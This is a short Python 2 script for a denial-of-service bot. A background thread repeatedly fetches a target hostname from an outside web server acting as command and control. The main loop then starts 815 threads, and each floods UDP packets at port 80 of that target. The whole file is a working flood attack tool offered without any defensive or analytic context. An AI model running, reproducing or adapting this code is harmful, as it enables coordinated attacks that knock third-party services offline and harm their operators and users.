import time, socket, os, sys, string, urllib2, threading
host = '127.0.0.1'
clientnum = 0

def server():
	global clientnum
	global host
	while True:
		gethost = urllib2.urlopen('http://apache server/site/')
		host = gethost.read()
		clean = host.split("</br>")
		clientnum = clean[1]
		clientnum = clientnum.rstrip('\n')
		host = clean[0]
		host = host.replace(' ', '').replace('\n', ' ').replace('\r', '')
		ip = socket.gethostbyname( host )
		#print ("\rHost = %s and clients = %s" %(host, clientnum)),
		time.sleep(100)


def attack():
	global host
	port = 80
	message="#I am the best in the world. "
	ip = socket.gethostbyname( host )
	ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while True:
		try:
			ddos.connect((host, port))
		except socket.error, msg:
			print("failed to connect") 
			break
		for i in range(100):
			try:
				ddos.send( message )
				ddos.sendto( message, (ip, port) )
				ddos.send( message );
			except socket.error, msg:
				break
	ddos.close()
	print "connection failed"


def main():
	global host
	run = 0
	print "DOS app started"
	t2 = threading.Thread(target = server)
	t2.daemon = True
	t2.start()
	while True:
		if run == 0:
			if (host != '127.0.0.1'):
				run = 1
				sys.stdout.write("\rAttacking Host: %s on port: 80                      " %host),
				sys.stdout.flush()
				for i in range(815):
						t = threading.Thread(target=attack)
						t.daemon = True
						t.start()
			else:
				sys.stdout.write("\rDOS not Active:                      "),
				sys.stdout.flush()
			if run == 1:
				t.join()
		else:
			time.sleep(1)


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print "DDOS stopped"
